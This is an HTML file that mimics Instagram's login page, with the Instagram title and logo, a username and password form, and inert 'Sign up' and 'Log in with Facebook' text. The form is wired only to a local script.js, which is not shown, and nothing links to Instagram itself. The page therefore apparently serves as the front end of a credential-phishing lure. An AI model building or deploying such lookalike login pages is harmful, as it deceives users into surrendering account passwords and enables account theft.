<!DOCTYPE html>
<html lang="en">
<head>
     <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="main-container">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" width="175" style="margin-top: 20px;">
            
            <form id="admin-box">
                <input type="text" id="user" placeholder="Phone number, username, or email" required>
                <input type="password" id="pass" placeholder="Password" required>
                <button type="submit" class="blue-btn">Log In</button>
            </form>

            <div class="or-text">OR</div>
            <div class="fb-text">Log in with Facebook</div>
        </div>

        <div class="signup-card">
            Don't have an account? <span style="color: #0095f6; font-weight: bold;">Sign up</span>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
